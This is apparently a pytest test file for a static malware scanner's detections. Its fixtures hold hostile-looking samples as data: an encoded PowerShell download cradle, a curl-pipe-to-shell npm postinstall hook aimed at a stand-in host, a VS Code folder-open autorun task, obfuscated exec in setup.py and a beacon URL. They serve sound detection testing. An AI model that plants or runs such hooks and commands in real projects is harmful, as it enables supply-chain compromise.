"""Signatures, decoded strings, code rules and GitHub scanning wired through the scanner."""
import base64
import json
import sys

import pytest

from scanything import api, repo
from scanything.ids import scan_id_of
from tests.conftest import scan_bytes, signal_ids
from tests.fixtures import make_pe, make_zip


def _xor(text: bytes, key: int) -> bytes:
    return bytes(c ^ key for c in text)


def test_xor_hidden_url_is_recovered_and_searchable():
    pe = make_pe(strings=b"\x00" + _xor(b"https://203.0.113.9/stage2.bin", 0x41) + b"\x00")
    r = scan_bytes("tool.exe", pe)
    f = r["files"][0]
    assert "xor_encoded_strings" in signal_ids(r)
    assert f["recovered"]["counts"]["xor"] == 1
    assert "https://203.0.113.9/stage2.bin" in f["iocs"]["notable_urls"]
    assert "[decoded] https://203.0.113.9/stage2.bin" in r["_scan"].strings[0]
    sig = next(s for s in f["signals"] if s["id"] == "xor_encoded_strings")
    assert sig["fp_note"] and sig["attack"] == ["T1027"]


def test_encoded_powershell_is_decoded():
    cmd = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')".encode("utf-16-le"))
    r = scan_bytes("run.bat", b"powershell -nop -enc " + cmd + b"\r\n")
    assert "encoded_powershell" in signal_ids(r)


def test_base64_pe_payload():
    blob = base64.b64encode(make_pe())
    r = scan_bytes("loader.js", b"var p = '" + blob + b"';\n")
    assert "base64_payload" in signal_ids(r)


def test_plain_text_has_no_recovered_section():
    r = scan_bytes("notes.txt", b"just some ordinary words in a text file\n" * 30)
    assert "recovered" not in r["files"][0]
    assert r["summary"]["heuristic_verdict"] == "no_static_indicators"


def test_signature_db_obfuscator_and_compiler_frameworks():
    r = scan_bytes("app.exe", make_pe(strings=b"\x00EazfuscatorAttribute\x00GCC: (GNU) 13\x00"))
    kinds = {fw["name"]: fw["kind"] for fw in r["files"][0]["frameworks"]}
    assert kinds["Eazfuscator.NET"] == "obfuscator" and kinds["MinGW/GCC"] == "compiler"
    ids = signal_ids(r)
    assert "framework_obfuscator" in ids and "framework_compiler" not in ids


def test_code_rules_fire_inside_any_archive():
    pkg = json.dumps({"name": "x", "scripts": {"postinstall": "curl -s https://x.test/i.sh | sh"}}).encode()
    tasks = b'{"tasks":[{"label":"x","command":"node a.js","runOptions":{"runOn":"folderOpen"}}]}'
    r = scan_bytes("project.zip", make_zip({"pkg/package.json": pkg, "pkg/.vscode/tasks.json": tasks,
                                            "pkg/README.md": b"curl https://x.test | sh\n"}))
    ids = signal_ids(r)
    assert {"npm_install_hook", "vscode_autorun"} <= ids
    readme = next(f for f in r["files"] if f["name"].endswith("README.md"))
    assert "curl_pipe_shell" not in {s["id"] for s in readme["signals"]}


INFO = {"repo": "octo/demo", "url": "https://github.com/octo/demo", "ref": "main", "commit": "a" * 40,
        "default_branch": "main", "stars": 0, "forks": 0, "created_at": "2020-01-01T00:00:00Z",
        "archived": False, "fork": False, "license": "MIT", "owner": "octo", "owner_created_at": None}
REPO_ZIP = make_zip({"demo-" + "a" * 40 + "/setup.py": b"import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n",
                     "demo-" + "a" * 40 + "/README.md": b"# demo\n"})


def test_scan_github_offline(monkeypatch):
    calls = []
    monkeypatch.setattr(repo, "fetch_repo", lambda o, n, ref=None: calls.append((o, n, ref)) or (REPO_ZIP, INFO))
    report, scan = api.scan_target("https://github.com/octo/demo")
    assert calls == [("octo", "demo", None)]
    assert report["target"]["kind"] == "github" and report["target"]["commit"] == "a" * 40
    assert report["engines"]["github"]["repo"] == "octo/demo"
    ids = {s["id"] for f in report["files"] for s in f["signals"]}
    assert {"python_setup_exec", "python_obfuscated_exec", "no_community"} <= ids
    assert "T1195.001" in {t["id"] for t in report["summary"]["attack_techniques"]}
    assert scan_id_of(json.loads(json.dumps(report))) == report["ids"]["scan_id"]


def test_repo_metadata_does_not_change_scan_id(monkeypatch):
    monkeypatch.setattr(repo, "fetch_repo", lambda o, n, ref=None: (REPO_ZIP, INFO))
    a, _ = api.scan_github("github:octo/demo")
    monkeypatch.setattr(repo, "fetch_repo", lambda o, n, ref=None: (REPO_ZIP, {**INFO, "stars": 900, "forks": 9}))
    b, _ = api.scan_github("github:octo/demo")
    assert a["ids"]["scan_id"] == b["ids"]["scan_id"]


@pytest.mark.skipif(sys.platform == "win32", reason="':' is not allowed in Windows file names")
def test_scan_target_prefers_local_file(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "github:octo").mkdir()
    (tmp_path / "github:octo" / "demo").write_bytes(b"hello\n")
    report, _ = api.scan_target("github:octo/demo")
    assert report["target"]["name"] == "demo"


def test_bad_repo_target_is_a_scan_error():
    try:
        api.scan_github("https://example.com/x")
    except api.ScanError as e:
        assert "not a GitHub repository" in str(e)
    else:
        raise AssertionError("expected ScanError")


def test_private_ips_are_not_raw_ip_iocs():
    r = scan_bytes("cfg.txt", b"proxy http://192.168.0.1:3128/ and http://10.0.0.2/x and http://127.0.0.1/\n" * 3)
    assert "raw_ip_url" not in signal_ids(r)
    r = scan_bytes("cfg.txt", b"beacon http://45.33.32.156:8080/gate.php\n")
    assert "raw_ip_url" in signal_ids(r)


def test_doc_links_are_not_url_iocs():
    r = scan_bytes("README.md", b"![logo](https://raw.githubusercontent.com/o/r/main/logo.png) http://45.33.32.156/\n")
    assert not {"shady_url", "raw_ip_url"} & signal_ids(r)


def test_scripts_in_a_repository_are_info_only(monkeypatch):
    z = make_zip({"demo/docs/make.bat": b"@echo off\nsphinx-build %*\n"})
    monkeypatch.setattr(repo, "fetch_repo", lambda o, n, ref=None: (z, INFO))
    report, _ = api.scan_github("github:octo/demo")
    sevs = {s["id"]: s["severity"] for f in report["files"] for s in f["signals"]}
    assert sevs["script_or_lure_in_archive"] == "info" and sevs["script_file"] == "info"
    assert scan_bytes("x.zip", z)["files"][0]["signals"][0]["severity"] == "medium"
